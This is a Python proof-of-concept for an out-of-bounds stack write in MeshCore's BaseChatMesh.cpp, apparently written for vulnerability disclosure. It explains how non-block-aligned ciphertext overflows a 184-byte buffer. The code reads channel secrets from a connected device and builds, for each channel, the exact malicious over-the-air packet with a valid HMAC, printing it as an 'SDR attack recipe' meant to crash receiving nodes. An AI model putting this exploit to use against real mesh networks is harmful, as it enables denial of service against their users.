#!/usr/bin/env python3
"""
Bug #1 PoC — Out-of-Bounds Write via data[len]=0 in BaseChatMesh.cpp
====================================================================
Affected: onPeerDataRecv()  (line ~217)  ->  DM text messages
          onGroupDataRecv() (line ~373)  ->  channel text messages

Root cause
----------
After MACThenDecrypt(), the decrypted length `len` is used *unchecked*
as an index into `uint8_t data[MAX_PACKET_PAYLOAD]` (184 bytes):

    data[len] = 0;   // null-terminate -- but len can be >= 184

Utils::decrypt() processes AES-128 ECB in 16-byte blocks and rounds UP
to the next block boundary.  If the ciphertext fed to decrypt() is NOT
a multiple of 16 (possible via raw radio injection), decrypt() writes
ceil(ct_len/16)*16 bytes into the 184-byte buffer AND returns that
inflated length.  For example 181 bytes of ciphertext -> 192 bytes
written -> 8-byte stack buffer overflow, then data[192]=0 overwrites
a 9th byte.

Exploitation vector
-------------------
* Normal API traffic is safe: encrypt() always produces multiples of 16.
* A raw LoRa injection (SDR / modified firmware) can craft a packet
  whose MAC+ciphertext length is NOT  2 + k*16.
* The HMAC is only 2 bytes -> brute-forceable in <=65 536 attempts for
  peer msgs.  Channel msgs need no brute-force if the attacker knows
  the channel secret (all members do).

Why the meshcore_py API cannot trigger OOB
------------------------------------------
The companion radio firmware always calls encrypt() which produces
block-aligned ciphertext (k*16 bytes).  There is no serial/BLE
command that lets us control the raw over-the-air payload type
(PAYLOAD_TYPE_GRP_TXT) while also bypassing encryption.
CMD_SEND_RAW_DATA forces PAYLOAD_TYPE_RAW_CUSTOM, which goes to a
different code path (onRawDataRecv) that is NOT vulnerable.

Therefore: full OOB exploitation requires a raw LoRa radio (SDR or
modified firmware) to inject PAYLOAD_TYPE_GRP_TXT with non-block-
aligned ciphertext.  This script proves the math and boundary, and
sends the max-length normal message to confirm the safe path.

How to use
----------
1. Install meshcore_py:
     pip install meshcore

2. Boundary analysis only (connects to device, no send):
     python bug1-oob-write.py -p COM3

3. Send a max-length DM to a contact:
     python bug1-oob-write.py -p COM3 -d <contact_name>

4. Send a max-length channel message on channel 0:
     python bug1-oob-write.py -p COM3 -c 0

5. Both at once:
     python bug1-oob-write.py -p COM3 -d <contact_name> -c 0
"""

import asyncio
import argparse
import hashlib
import sys

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore package not found -- pip install meshcore")


# ---------- protocol constants (must match firmware) ----------
MAX_PACKET_PAYLOAD   = 184
CIPHER_MAC_SIZE      = 2
CIPHER_BLOCK_SIZE    = 16
# DM payload: [dest_hash 1] [src_hash 1] [MAC 2] [ciphertext]
DM_HEADER_OVERHEAD   = 1 + 1 + CIPHER_MAC_SIZE           # 4
# Plaintext inside ciphertext: [timestamp 4] [flags 1] [text …]
DM_PLAIN_OVERHEAD    = 4 + 1                               # 5
# Channel payload: [chan_hash 1] [MAC 2] [ciphertext]
CH_HEADER_OVERHEAD   = 1 + CIPHER_MAC_SIZE                 # 3
CH_PLAIN_OVERHEAD    = 4 + 1                               # 5  (timestamp + txt_type)


def max_text_len(header_overhead: int, plain_overhead: int) -> tuple[int, int]:
    """Return (max_text_bytes, decrypted_len_on_receiver)."""
    max_ct = MAX_PACKET_PAYLOAD - header_overhead
    # encrypt() rounds up to CIPHER_BLOCK_SIZE
    usable_blocks = max_ct // CIPHER_BLOCK_SIZE
    ct_len = usable_blocks * CIPHER_BLOCK_SIZE
    plaintext_cap = ct_len  # decrypt returns this
    text_cap = plaintext_cap - plain_overhead
    return text_cap, plaintext_cap


async def main() -> None:
    ap = argparse.ArgumentParser(description="Bug #1 OOB-write PoC")
    ap.add_argument("-p", "--port", required=True, help="Serial port (e.g. COM3)")
    ap.add_argument("-b", "--baud", type=int, default=115200)
    ap.add_argument("-d", "--dest", default=None,
                    help="Contact name for DM test (optional)")
    ap.add_argument("-c", "--channel", type=int, default=None,
                    help="Channel index for channel-msg test (optional)")
    args = ap.parse_args()

    # ---- show boundary analysis ----
    dm_text, dm_dec = max_text_len(DM_HEADER_OVERHEAD, DM_PLAIN_OVERHEAD)
    ch_text, ch_dec = max_text_len(CH_HEADER_OVERHEAD, CH_PLAIN_OVERHEAD)

    print("=== Bug #1  OOB-write boundary analysis ===")
    print(f"Buffer size       : {MAX_PACKET_PAYLOAD}")
    print(f"DM   max text     : {dm_text} bytes  ->  decrypted len = {dm_dec}  "
          f"->  data[{dm_dec}]=0  {'SAFE' if dm_dec < MAX_PACKET_PAYLOAD else 'OOB!'}")
    print(f"Chan max text     : {ch_text} bytes  ->  decrypted len = {ch_dec}  "
          f"->  data[{ch_dec}]=0  {'SAFE' if ch_dec < MAX_PACKET_PAYLOAD else 'OOB!'}")
    print()
    # What a malicious packet would achieve
    # Channel: 1 byte header -> ciphertext can be up to 181 bytes
    #          181 / 16 rounds up to 12 blocks = 192  ->  OOB by 8 bytes
    mal_ct = MAX_PACKET_PAYLOAD - 1 - CIPHER_MAC_SIZE  # 181
    mal_dec = ((mal_ct + CIPHER_BLOCK_SIZE - 1) // CIPHER_BLOCK_SIZE) * CIPHER_BLOCK_SIZE
    print(f"Malicious channel pkt: ciphertext = {mal_ct} (not multiple of 16)")
    print(f"  decrypt() writes {mal_dec} bytes to {MAX_PACKET_PAYLOAD}-byte buf -> "
          f"overflow by {mal_dec - MAX_PACKET_PAYLOAD} bytes")
    print(f"  then data[{mal_dec}] = 0 -> total OOB = {mal_dec - MAX_PACKET_PAYLOAD + 1} bytes")
    print()

    # ---- connect to read channel keys (for SDR recipe) ----
    mc = await MeshCore.create_serial(args.port, args.baud, debug=False)
    if mc is None:
        sys.exit("Could not connect")

    try:
        await mc.ensure_contacts()

        # ---- Print SDR attack recipe for each configured channel ----
        print("=== SDR attack recipe (requires raw LoRa radio) ===")
        print()
        print("The meshcore_py API cannot trigger this bug because the companion")
        print("firmware always block-aligns ciphertext via encrypt().")
        print("CMD_SEND_RAW_DATA forces PAYLOAD_TYPE_RAW_CUSTOM (different handler).")
        print("A raw radio (SDR/modified firmware) is required to inject")
        print("PAYLOAD_TYPE_GRP_TXT with non-block-aligned ciphertext.")
        print()

        channels = mc.channels
        found_any = False
        for i, ch in enumerate(channels):
            if not ch or "channel_secret" not in ch:
                continue
            found_any = True
            secret = ch["channel_secret"]
            if isinstance(secret, str):
                secret = bytes.fromhex(secret)
            ch_name = ch.get("channel_name", f"ch{i}")
            ch_hash_byte = hashlib.sha256(secret).digest()[0]

            # Construct the exact 184-byte OTA payload that triggers OOB:
            #   [channel_hash 1] [HMAC 2] [ciphertext 181]
            # Ciphertext: 181 bytes of anything (AES-ECB decrypts in 16-byte blocks,
            #   rounds up to 192 -> 8 bytes past 184-byte buffer)
            # HMAC: HMAC-SHA256(secret, ciphertext)[:2]
            import hmac as hmac_mod
            fake_ct = bytes(mal_ct)  # 181 zero bytes (content irrelevant for crash)
            mac = hmac_mod.new(secret, fake_ct, hashlib.sha256).digest()[:CIPHER_MAC_SIZE]
            ota_payload = bytes([ch_hash_byte]) + mac + fake_ct
            assert len(ota_payload) == MAX_PACKET_PAYLOAD

            print(f"  Channel #{i} ({ch_name}):")
            print(f"    Secret (hex)   : {secret.hex()}")
            print(f"    Channel hash   : 0x{ch_hash_byte:02x}")
            print(f"    OTA payload ({len(ota_payload)} bytes):")
            print(f"      {ota_payload[:32].hex()}...")
            print(f"    Header byte    : 0x{0x05 << 4 | 0x02:02x}  (PAYLOAD_TYPE_GRP_TXT | ROUTE_TYPE_FLOOD)")
            print(f"    Receiver effect: decrypt() writes {mal_dec} bytes into {MAX_PACKET_PAYLOAD}-byte buffer")
            print(f"                     data[{mal_dec}]=0 -> {mal_dec - MAX_PACKET_PAYLOAD + 1} bytes OOB")
            print(f"                     -> stack corruption -> likely HardFault/reboot")
            print()

        if not found_any:
            print("  No channels configured -- cannot generate SDR recipe.")
            print("  Configure a channel first: set_channel(0, '#test')")
            print()

        # ---- DM boundary test (normal API -- proves safe path) ----
        if args.dest:
            contact = mc.get_contact_by_name(args.dest)
            if not contact:
                print(f"Contact '{args.dest}' not found"); return
            payload = "A" * dm_text
            print(f"Sending {dm_text}-byte DM to {args.dest} ...")
            r = await mc.commands.send_msg(contact, payload)
            print(f"  Result: {r.type.value}  "
                  f"(receiver will decrypt {dm_dec} bytes, data[{dm_dec}]=0 -> "
                  f"{'within bounds' if dm_dec < MAX_PACKET_PAYLOAD else 'OOB WRITE'})")

        # ---- Channel boundary test (normal API -- proves safe path) ----
        if args.channel is not None:
            payload = "A" * ch_text
            print(f"Sending {ch_text}-byte channel msg on ch {args.channel} ...")
            r = await mc.commands.send_chan_msg(args.channel, payload)
            print(f"  Result: {r.type.value}  "
                  f"(receiver will decrypt {ch_dec} bytes, data[{ch_dec}]=0 -> "
                  f"{'within bounds' if ch_dec < MAX_PACKET_PAYLOAD else 'OOB WRITE'})")

    finally:
        await mc.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
